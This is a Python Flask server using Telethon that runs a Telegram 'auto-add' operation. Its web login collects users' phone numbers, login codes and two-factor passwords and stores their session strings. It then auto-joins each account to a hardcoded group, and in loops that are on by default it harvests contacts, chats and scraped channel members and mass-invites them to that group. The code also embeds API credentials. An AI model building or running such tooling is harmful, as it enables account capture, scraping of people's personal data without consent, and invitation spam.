from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
import sqlite3
from datetime import datetime, timedelta
import socket

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Database file
DB_FILE = 'telegram_accounts.db'

# Storage
temp_sessions = {}
active_clients = {}
client_tasks = {}

# ==================== DATABASE FUNCTIONS ====================

def init_db():
    """Initialize SQLite database for persistent storage"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Accounts table
    c.execute('''CREATE TABLE IF NOT EXISTS accounts
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  phone TEXT UNIQUE,
                  name TEXT,
                  session_string TEXT,
                  created_at TIMESTAMP,
                  last_active TIMESTAMP)''')
    
    # Auto-add settings table
    c.execute('''CREATE TABLE IF NOT EXISTS auto_add_settings
                 (account_id INTEGER PRIMARY KEY,
                  enabled INTEGER DEFAULT 1,
                  target_group TEXT DEFAULT 'Abe_armygroup',
                  daily_limit INTEGER DEFAULT 100,
                  delay_seconds INTEGER DEFAULT 30,
                  added_today INTEGER DEFAULT 0,
                  last_reset DATE,
                  auto_join INTEGER DEFAULT 1,
                  source_groups TEXT,
                  use_contacts INTEGER DEFAULT 1,
                  use_recent_chats INTEGER DEFAULT 1,
                  use_scraping INTEGER DEFAULT 1,
                  scrape_limit INTEGER DEFAULT 100,
                  skip_bots INTEGER DEFAULT 1,
                  skip_inaccessible INTEGER DEFAULT 1,
                  FOREIGN KEY (account_id) REFERENCES accounts(id))''')
    
    # Auto-reply settings table (placeholder for future use)
    c.execute('''CREATE TABLE IF NOT EXISTS reply_settings
                 (account_id INTEGER PRIMARY KEY,
                  enabled INTEGER DEFAULT 0,
                  settings TEXT,
                  FOREIGN KEY (account_id) REFERENCES accounts(id))''')
    
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

def save_account_to_db(phone, name, session_string):
    """Save account to database"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute('''INSERT INTO accounts (phone, name, session_string, created_at, last_active)
                     VALUES (?, ?, ?, ?, ?)''',
                  (phone, name, session_string, datetime.now(), datetime.now()))
        account_id = c.lastrowid
        conn.commit()
        
        # Create default auto-add settings (ENABLED BY DEFAULT)
        c.execute('''INSERT INTO auto_add_settings 
                     (account_id, enabled, target_group, daily_limit, delay_seconds, auto_join, source_groups)
                     VALUES (?, 1, 'Abe_armygroup', 100, 30, 1, ?)''',
                  (account_id, json.dumps(['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn'])))
        
        # Create placeholder reply settings (disabled by default)
        c.execute('''INSERT INTO reply_settings (account_id, enabled, settings)
                     VALUES (?, 0, '{}')''', (account_id,))
        
        conn.commit()
        logger.info(f"✅ Account saved: {phone} ({name})")
        return account_id
    except Exception as e:
        logger.error(f"Error saving account: {e}")
        return None
    finally:
        conn.close()

def load_accounts_from_db():
    """Load all accounts from database"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''SELECT id, phone, name, session_string FROM accounts ORDER BY id''')
    rows = c.fetchall()
    conn.close()
    
    accounts = []
    for row in rows:
        accounts.append({
            'id': row[0],
            'phone': row[1],
            'name': row[2],
            'session': row[3]
        })
    return accounts

def get_auto_add_settings(account_id):
    """Get auto-add settings for account"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''SELECT enabled, target_group, daily_limit, delay_seconds, added_today, last_reset,
                        auto_join, source_groups, use_contacts, use_recent_chats, use_scraping,
                        scrape_limit, skip_bots, skip_inaccessible
                 FROM auto_add_settings WHERE account_id = ?''', (account_id,))
    row = c.fetchone()
    conn.close()
    
    if row:
        return {
            'enabled': bool(row[0]),
            'target_group': row[1] or 'Abe_armygroup',
            'daily_limit': row[2] or 100,
            'delay_seconds': row[3] or 30,
            'added_today': row[4] or 0,
            'last_reset': row[5] or datetime.now().strftime('%Y-%m-%d'),
            'auto_join': bool(row[6] if row[6] is not None else 1),
            'source_groups': json.loads(row[7]) if row[7] else ['@telegram', '@durov'],
            'use_contacts': bool(row[8] if row[8] is not None else 1),
            'use_recent_chats': bool(row[9] if row[9] is not None else 1),
            'use_scraping': bool(row[10] if row[10] is not None else 1),
            'scrape_limit': row[11] or 100,
            'skip_bots': bool(row[12] if row[12] is not None else 1),
            'skip_inaccessible': bool(row[13] if row[13] is not None else 1)
        }
    return None

def update_auto_add_settings(account_id, settings):
    """Update auto-add settings in database"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''UPDATE auto_add_settings SET
                    enabled = ?,
                    target_group = ?,
                    daily_limit = ?,
                    delay_seconds = ?,
                    added_today = ?,
                    last_reset = ?,
                    auto_join = ?,
                    source_groups = ?,
                    use_contacts = ?,
                    use_recent_chats = ?,
                    use_scraping = ?,
                    scrape_limit = ?,
                    skip_bots = ?,
                    skip_inaccessible = ?
                 WHERE account_id = ?''',
              (1 if settings.get('enabled') else 0,
               settings.get('target_group', 'Abe_armygroup'),
               settings.get('daily_limit', 100),
               settings.get('delay_seconds', 30),
               settings.get('added_today', 0),
               settings.get('last_reset', datetime.now().strftime('%Y-%m-%d')),
               1 if settings.get('auto_join', True) else 0,
               json.dumps(settings.get('source_groups', [])),
               1 if settings.get('use_contacts', True) else 0,
               1 if settings.get('use_recent_chats', True) else 0,
               1 if settings.get('use_scraping', True) else 0,
               settings.get('scrape_limit', 100),
               1 if settings.get('skip_bots', True) else 0,
               1 if settings.get('skip_inaccessible', True) else 0,
               account_id))
    conn.commit()
    conn.close()
    logger.info(f"✅ Updated auto-add settings for account {account_id}")

def remove_account_from_db(account_id):
    """Remove account from database"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM accounts WHERE id = ?", (account_id,))
    c.execute("DELETE FROM auto_add_settings WHERE account_id = ?", (account_id,))
    c.execute("DELETE FROM reply_settings WHERE account_id = ?", (account_id,))
    conn.commit()
    conn.close()
    logger.info(f"✅ Removed account {account_id}")

def update_account_last_active(account_id):
    """Update last active timestamp"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE accounts SET last_active = ? WHERE id = ?", (datetime.now(), account_id))
    conn.commit()
    conn.close()

# ==================== HELPER FUNCTIONS ====================

def run_async(coro):
    """Run async function in sync context"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# ==================== AUTO-ADD MEMBER FUNCTIONS ====================

async def auto_join_target_group(client, account_id, target_group):
    """Auto-join the target group when account is created"""
    try:
        logger.info(f"🔗 Auto-joining account {account_id} to group: {target_group}")
        
        # Clean group name
        group_name = target_group
        if group_name.startswith('https://t.me/'):
            group_name = group_name.replace('https://t.me/', '@')
        elif not group_name.startswith('@'):
            group_name = '@' + group_name
        
        # Get group entity
        try:
            group = await client.get_entity(group_name)
            logger.info(f"✅ Found group: {group.title if hasattr(group, 'title') else group_name}")
        except Exception as e:
            logger.error(f"Could not find group {group_name}: {e}")
            return False
        
        # Try to join
        try:
            await client(functions.messages.ImportChatInviteRequest(group.username))
            logger.info(f"✅ Successfully auto-joined group: {group_name}")
            return True
        except:
            try:
                await client.join_channel(group.id)
                logger.info(f"✅ Successfully auto-joined channel: {group_name}")
                return True
            except Exception as e:
                logger.warning(f"Could not auto-join: {e}")
                return False
                
    except Exception as e:
        logger.error(f"Error auto-joining: {e}")
        return False

async def get_members_from_all_sources(client, settings):
    """Get potential members from ALL available sources"""
    members = set()
    sources_used = []
    
    # 1. Get from contacts
    if settings.get('use_contacts', True):
        try:
            logger.info("📱 Getting members from contacts...")
            contacts = await client(functions.contacts.GetContactsRequest(0))
            for user in contacts.users:
                if user.id and (not user.bot or not settings.get('skip_bots', True)):
                    members.add(user.id)
            if contacts.users:
                sources_used.append(f"contacts ({len(contacts.users)} users)")
                logger.info(f"✅ Found {len(contacts.users)} contacts")
        except Exception as e:
            logger.error(f"Error getting contacts: {e}")
    
    # 2. Get from recent chats/dialogs
    if settings.get('use_recent_chats', True):
        try:
            logger.info("💬 Getting members from recent chats...")
            dialogs = await client.get_dialogs(limit=200)
            for dialog in dialogs:
                if dialog.is_user and dialog.entity and dialog.entity.id:
                    user = dialog.entity
                    if not user.bot or not settings.get('skip_bots', True):
                        members.add(user.id)
            if dialogs:
                sources_used.append(f"recent chats ({len([d for d in dialogs if d.is_user])} users)")
                logger.info(f"✅ Found users from {len(dialogs)} dialogs")
        except Exception as e:
            logger.error(f"Error getting recent chats: {e}")
    
    # 3. Scrape from source groups
    if settings.get('use_scraping', True):
        source_groups = settings.get('source_groups', [])
        
        if not source_groups or len(source_groups) == 0:
            source_groups = ['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn']
            logger.info(f"Using default source groups: {source_groups}")
        
        for group_ref in source_groups[:5]:
            if not group_ref:
                continue
            try:
                logger.info(f"👥 Scraping members from: {group_ref}")
                
                # Clean group reference
                group_ref_clean = group_ref.strip()
                if group_ref_clean.startswith('https://t.me/'):
                    group_ref_clean = group_ref_clean.replace('https://t.me/', '@')
                elif not group_ref_clean.startswith('@'):
                    group_ref_clean = '@' + group_ref_clean
                
                # Get group entity
                try:
                    source_group = await client.get_entity(group_ref_clean)
                    logger.info(f"✅ Found source group: {source_group.title if hasattr(source_group, 'title') else group_ref_clean}")
                except Exception as e:
                    logger.warning(f"Could not find group {group_ref_clean}: {e}")
                    continue
                
                # Get participants
                try:
                    limit = settings.get('scrape_limit', 100)
                    participants = []
                    async for user in client.iter_participants(source_group, limit=limit):
                        if user and user.id:
                            if not user.bot or not settings.get('skip_bots', True):
                                participants.append(user.id)
                            if len(participants) >= limit:
                                break
                    
                    for user_id in participants:
                        members.add(user_id)
                    
                    if participants:
                        sources_used.append(f"{group_ref_clean} ({len(participants)} users)")
                        logger.info(f"✅ Scraped {len(participants)} members from {group_ref_clean}")
                    else:
                        logger.warning(f"No participants found in {group_ref_clean}")
                        
                except errors.ChatAdminRequiredError:
                    logger.warning(f"Admin required to view members in {group_ref_clean}")
                except errors.ChatNotModifiedError:
                    logger.warning(f"Cannot access members in {group_ref_clean}")
                except Exception as e:
                    logger.error(f"Error scraping {group_ref_clean}: {e}")
                    
            except Exception as e:
                logger.error(f"Error processing group {group_ref}: {e}")
    
    # 4. Get from top peers
    try:
        logger.info("🤝 Getting top peers...")
        mutual = await client(functions.contacts.GetTopPeersRequest(
            correspondents=True,
            limit=100
        ))
        for user in mutual.users:
            if user.id and (not user.bot or not settings.get('skip_bots', True)):
                members.add(user.id)
        if mutual.users:
            sources_used.append(f"top peers ({len(mutual.users)} users)")
            logger.info(f"✅ Found {len(mutual.users)} top peers")
    except Exception as e:
        logger.error(f"Error getting top peers: {e}")
    
    # Convert to list
    members_list = [m for m in members if m and m > 0]
    
    logger.info(f"📊 TOTAL members collected: {len(members_list)}")
    logger.info(f"📡 Sources used: {', '.join(sources_used) if sources_used else 'None'}")
    
    return members_list, sources_used

async def auto_add_member_loop(account):
    """Background task to add members to group - ALWAYS ON by default"""
    account_id = account['id']
    consecutive_failures = 0
    auto_joined = False
    
    while True:
        try:
            # Get fresh settings from database
            settings = get_auto_add_settings(account_id)
            
            if not settings:
                logger.warning(f"No settings found for account {account_id}, skipping")
                await asyncio.sleep(60)
                continue
            
            # Check if enabled
            if not settings.get('enabled', True):
                logger.info(f"Auto-add disabled for account {account_id}, sleeping...")
                await asyncio.sleep(60)
                continue
            
            target_group = settings.get('target_group', 'Abe_armygroup')
            daily_limit = settings.get('daily_limit', 100)
            delay_seconds = settings.get('delay_seconds', 30)
            
            # Create client
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    logger.error(f"Account {account_id} not authorized")
                    await asyncio.sleep(60)
                    continue
                
                # Auto-join target group if not already joined
                if not auto_joined and settings.get('auto_join', True):
                    joined = await auto_join_target_group(client, account_id, target_group)
                    if joined:
                        auto_joined = True
                        logger.info(f"✅ Account {account_id} successfully joined {target_group}")
                    else:
                        logger.warning(f"Could not auto-join {target_group}, will retry later")
                
                # Reset counter if new day
                today = datetime.now().strftime('%Y-%m-%d')
                if settings.get('last_reset') != today:
                    settings['added_today'] = 0
                    settings['last_reset'] = today
                    update_auto_add_settings(account_id, settings)
                    logger.info(f"📅 Reset daily counter for account {account_id}")
                
                # Check daily limit
                if settings['added_today'] >= daily_limit:
                    logger.info(f"Daily limit reached: {settings['added_today']}/{daily_limit}")
                    await asyncio.sleep(3600)
                    continue
                
                # Get the target group entity
                group_name = target_group
                if not group_name.startswith('@') and not group_name.startswith('https://'):
                    group_name = '@' + group_name
                
                try:
                    group = await client.get_entity(group_name)
                    logger.info(f"✅ Target group found: {group.title if hasattr(group, 'title') else group_name}")
                except Exception as e:
                    logger.error(f"Could not find target group {group_name}: {e}")
                    await asyncio.sleep(300)
                    continue
                
                # Get existing members to avoid duplicates
                existing_members = set()
                try:
                    async for user in client.iter_participants(group, limit=1000):
                        if user and user.id:
                            existing_members.add(user.id)
                    logger.info(f"Group has {len(existing_members)} existing members")
                except Exception as e:
                    logger.error(f"Error getting existing members: {e}")
                
                # Get potential members from all sources
                potential_members, sources_used = await get_members_from_all_sources(client, settings)
                
                if not potential_members:
                    logger.warning("No potential members found. Waiting before retry...")
                    await asyncio.sleep(600)
                    continue
                
                # Filter out existing members
                new_members = [uid for uid in potential_members if uid not in existing_members]
                
                logger.info(f"🆕 Found {len(new_members)} new members to add")
                
                if not new_members:
                    logger.info("No new members to add. Waiting for new sources...")
                    await asyncio.sleep(1800)
                    continue
                
                # Add members
                added = 0
                for user_id in new_members[:daily_limit - settings['added_today']]:
                    try:
                        if settings['added_today'] >= daily_limit:
                            break
                        
                        # Skip bots if enabled
                        if settings.get('skip_bots', True):
                            try:
                                user = await client.get_entity(user_id)
                                if user.bot:
                                    logger.info(f"Skipping bot: {user_id}")
                                    continue
                            except:
                                pass
                        
                        # Add to group
                        try:
                            await client(functions.channels.InviteToChannelRequest(
                                group,
                                [await client.get_input_entity(user_id)]
                            ))
                            
                            settings['added_today'] += 1
                            added += 1
                            update_auto_add_settings(account_id, settings)
                            
                            logger.info(f"✅ Added user {user_id} to {target_group} (Total: {settings['added_today']}/{daily_limit})")
                            
                            # Wait between adds
                            await asyncio.sleep(delay_seconds)
                            
                        except errors.FloodWaitError as e:
                            logger.warning(f"Flood wait: {e.seconds}s")
                            await asyncio.sleep(e.seconds)
                        except errors.UserPrivacyRestrictedError:
                            logger.warning(f"Cannot add {user_id}: privacy restricted")
                        except errors.UserNotMutualContactError:
                            logger.warning(f"Cannot add {user_id}: not mutual contact")
                        except Exception as e:
                            logger.error(f"Error adding {user_id}: {e}")
                            consecutive_failures += 1
                            
                            if consecutive_failures > 5:
                                logger.warning("Too many failures, waiting 5 minutes...")
                                await asyncio.sleep(300)
                                consecutive_failures = 0
                    
                    except Exception as e:
                        logger.error(f"Unexpected error: {e}")
                        continue
                
                logger.info(f"📈 Added {added} members this cycle. Total today: {settings['added_today']}")
                
            except Exception as e:
                logger.error(f"Loop error: {e}")
            finally:
                await client.disconnect()
            
            # Wait before next cycle
            wait_time = random.randint(900, 1800)
            logger.info(f"⏰ Waiting {wait_time} seconds before next cycle...")
            await asyncio.sleep(wait_time)
            
        except Exception as e:
            logger.error(f"Critical error in auto-add loop: {e}")
            await asyncio.sleep(300)

def start_auto_add_for_all_accounts():
    """Start auto-add for all accounts"""
    accounts = load_accounts_from_db()
    
    for account in accounts:
        settings = get_auto_add_settings(account['id'])
        if settings and settings.get('enabled', True):
            if f"auto_add_{account['id']}" not in client_tasks:
                thread = threading.Thread(
                    target=lambda: run_async(auto_add_member_loop(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[f"auto_add_{account['id']}"] = thread
                logger.info(f"🚀 Started auto-add for account {account['id']}")

# ==================== PAGE ROUTES ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/auto-add')
def auto_add():
    return send_file('auto_add.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

# ==================== API ROUTES ====================

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    """Get all accounts"""
    accounts = load_accounts_from_db()
    formatted = []
    for acc in accounts:
        settings = get_auto_add_settings(acc['id'])
        formatted.append({
            'id': acc['id'],
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'auto_add_enabled': settings.get('enabled', True) if settings else True
        })
    return jsonify({'success': True, 'accounts': formatted})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    """Start account addition process"""
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data received'})
        
        phone = data.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Adding account for phone: {phone}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                logger.info(f"Code sent successfully to {phone}")
                
                session_id = str(int(time.time()))
                temp_sessions[session_id] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': session_id}
                
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except errors.PhoneNumberBannedError:
                return {'success': False, 'error': 'This phone number is banned'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(send_code())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in add_account: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Verify code and complete account addition"""
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    inviter = data.get('inviter')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            # Save to database
            account_id = save_account_to_db(
                me.phone or session_data['phone'],
                me.first_name or 'User',
                client.session.save()
            )
            
            if not account_id:
                return {'success': False, 'error': 'Failed to save account'}
            
            # AUTO-JOIN TARGET GROUP
            target_group = 'Abe_armygroup'
            try:
                logger.info(f"Auto-joining account {me.first_name} to {target_group}")
                await auto_join_target_group(client, account_id, target_group)
            except Exception as e:
                logger.error(f"Auto-join error: {e}")
            
            return {'success': True, 'account_id': account_id}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except errors.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    """Remove account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    remove_account_from_db(account_id)
    return jsonify({'success': True})

@app.route('/api/auto-add-settings', methods=['GET'])
def get_auto_add_settings_route():
    """Get auto-add settings for account"""
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = get_auto_add_settings(int(account_id))
    
    if not settings:
        # Create default settings if none exist
        settings = {
            'enabled': True,
            'target_group': 'Abe_armygroup',
            'daily_limit': 100,
            'delay_seconds': 30,
            'added_today': 0,
            'last_reset': datetime.now().strftime('%Y-%m-%d'),
            'auto_join': True,
            'source_groups': ['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn'],
            'use_contacts': True,
            'use_recent_chats': True,
            'use_scraping': True,
            'scrape_limit': 100,
            'skip_bots': True,
            'skip_inaccessible': True
        }
    
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/auto-add-settings', methods=['POST'])
def update_auto_add_settings_route():
    """Update auto-add settings"""
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', True)
    target_group = data.get('target_group', 'Abe_armygroup')
    daily_limit = data.get('daily_limit', 100)
    delay_seconds = data.get('delay_seconds', 30)
    source_groups = data.get('source_groups', [])
    use_contacts = data.get('use_contacts', True)
    use_recent_chats = data.get('use_recent_chats', True)
    use_scraping = data.get('use_scraping', True)
    scrape_limit = data.get('scrape_limit', 100)
    skip_bots = data.get('skip_bots', True)
    skip_inaccessible = data.get('skip_inaccessible', True)
    auto_join = data.get('auto_join', True)
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = {
        'enabled': enabled,
        'target_group': target_group,
        'daily_limit': daily_limit,
        'delay_seconds': delay_seconds,
        'source_groups': source_groups,
        'use_contacts': use_contacts,
        'use_recent_chats': use_recent_chats,
        'use_scraping': use_scraping,
        'scrape_limit': scrape_limit,
        'skip_bots': skip_bots,
        'skip_inaccessible': skip_inaccessible,
        'auto_join': auto_join
    }
    
    update_auto_add_settings(int(account_id), settings)
    
    return jsonify({'success': True, 'message': 'Auto-add settings updated'})

@app.route('/api/auto-add-stats', methods=['GET'])
def get_auto_add_stats():
    """Get auto-add statistics"""
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = get_auto_add_settings(int(account_id))
    
    if not settings:
        return jsonify({
            'success': True,
            'added_today': 0,
            'daily_limit': 100,
            'enabled': True,
            'last_reset': datetime.now().strftime('%Y-%m-%d')
        })
    
    return jsonify({
        'success': True,
        'added_today': settings.get('added_today', 0),
        'daily_limit': settings.get('daily_limit', 100),
        'enabled': settings.get('enabled', True),
        'last_reset': settings.get('last_reset', '')
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    """Test auto-add functionality"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    accounts = load_accounts_from_db()
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def test():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Account not authorized'}
            
            # Test finding target group
            target_group = 'Abe_armygroup'
            try:
                group = await client.get_entity('@' + target_group)
                group_found = True
                group_title = group.title if hasattr(group, 'title') else target_group
            except Exception as e:
                group_found = False
                group_title = str(e)
            
            # Test finding members from contacts
            contacts_count = 0
            try:
                contacts = await client(functions.contacts.GetContactsRequest(0))
                contacts_count = len(contacts.users)
            except:
                pass
            
            # Test finding members from recent chats
            dialogs_count = 0
            try:
                dialogs = await client.get_dialogs(limit=50)
                dialogs_count = len([d for d in dialogs if d.is_user])
            except:
                pass
            
            return {
                'success': True,
                'group_found': group_found,
                'group_title': group_title,
                'contacts_count': contacts_count,
                'recent_chats_count': dialogs_count,
                'can_add_members': group_found and (contacts_count > 0 or dialogs_count > 0)
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(test())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    accounts = load_accounts_from_db()
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'time': datetime.now().isoformat()
    })

@app.route('/ping')
def ping():
    return "pong"

# ==================== STARTUP ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    # Initialize database
    init_db()
    
    print('\n' + '='*70)
    print('🤖 TELEGRAM AUTO-ADD SYSTEM')
    print('='*70)
    print(f'✅ Port: {port}')
    
    accounts = load_accounts_from_db()
    print(f'✅ Accounts loaded: {len(accounts)}')
    
    for acc in accounts:
        settings = get_auto_add_settings(acc['id'])
        status = "ENABLED" if (settings and settings.get('enabled', True)) else "DISABLED"
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - Auto-Add: {status}')
    
    print('='*70)
    print('🚀 FEATURES:')
    print('   • Auto-add members to groups')
    print('   • Auto-join target group on account creation')
    print('   • Multiple member sources (contacts, chats, groups)')
    print('   • Daily limits: 100-500 members/day')
    print('   • Delay between adds: 20-50 seconds')
    print('   • Persistent database storage')
    print('='*70 + '\n')
    
    # Start auto-add for all accounts
    start_auto_add_for_all_accounts()
    
    # Start Flask
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
